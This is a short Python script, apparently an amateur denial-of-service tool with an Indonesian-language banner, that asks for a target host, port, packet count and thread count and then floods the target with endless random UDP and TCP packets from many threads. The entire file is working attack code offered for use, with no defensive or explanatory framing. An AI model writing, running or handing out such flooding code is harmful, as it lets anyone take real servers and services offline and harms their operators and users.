#!/usr/bin/env python3
import random
import socket
import threading
import os,sys
import time

os.system("clear")
print("""\033[91m
print       (" ────────────── [ XVAll X UDIN] ────────────── ")
print       (" LOADING SABAR...")
time.sleep(1)
print       (" 【■■■■               】 10 % ")
time.sleep(1)
print       (" 【■■■■■■■■           】 25 % ")
time.sleep(1)
print       (" 【■■■■■■■■■■■■■      】 70 %  ")           
time.sleep(1)             
print       (" 【■■■■■■■■■■■■■■■■■■■】 100 % ")
time.sleep(1)
print       (" DONE LOADING TOOLS XVAllxUDIN ")
print       (" ───────────── [ WELCOME BRO ] ───────────── ")
""")
print("\033[0m")

ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" Gas Ddos?(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(9800)
	i = random.choice(("[PERMISI!!!","[PERMISI!!]","[PERMISI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET FROM UDIN X XVAll!!!")
		except:
			print("DOWN KAH BANG!!!")

def run2():
	data = random._urandom(98)
	i = random.choice(("[PERMISI!!]","[PERMISI!!]","[PPERMISI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET FROM UDIN X XVAll!!!")
		except:
			s.close()
			print("DOWN KAH BANG!!!")

def run3():
	data = random._urandom(18)
	i = random.choice(("[PERMISI!!]","[PERMISI!!]","[PERMISI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET FROM UDIN X XVAll!!!")
		except:
			s.close()
			print("DOWN KAH BANG!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
